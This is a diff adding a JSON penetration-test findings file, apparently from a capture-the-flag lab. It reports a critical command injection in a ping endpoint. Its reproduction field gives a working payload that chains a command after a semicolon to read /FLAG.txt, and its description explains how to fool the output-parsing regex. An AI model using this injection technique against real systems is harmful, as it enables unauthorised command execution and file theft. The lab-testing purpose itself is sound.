@@ -1,0 +1,25 @@
+{
+  "meta": {
+    "created": "2026-04-14T14:53:21.544055+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "ee5b475d-1ab4-4a98-bf1d-a421fe2a7d57",
+      "timestamp": "2026-04-14T14:53:21.543929+00:00",
+      "title": "Command Injection - Output Parser Bypass",
+      "severity": "critical",
+      "target": "http://172.17.0.1:38581",
+      "description": "The ping tool is vulnerable to command injection via the ip_address parameter. The application filters <, >, |, & but allows semicolons and backticks for command chaining. The output parser uses a regex to extract ping statistics, which can be tricked by injecting output that matches the expected pattern '(.*?) packets transmitted, (.*?), Packet Loss: (.*?)%'. By injecting crafted output, the flag can be extracted through the captured groups.",
+      "evidence": "flag{780e393f-6041-41c0-a7e4-bb025c76ef6e}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "POST /ping with body: ip_address=invalid; echo \"2 packets transmitted, $(cat /FLAG.txt) received, 0% packet loss\"",
+        "expected": "Packets Transmitted: 2, Packets Received: flag{780e393f-6041-41c0-a7e4-bb025c76ef6e}, Packet Loss: 0%"
+      }
+    }
+  ],
+  "diagrams": []
+}
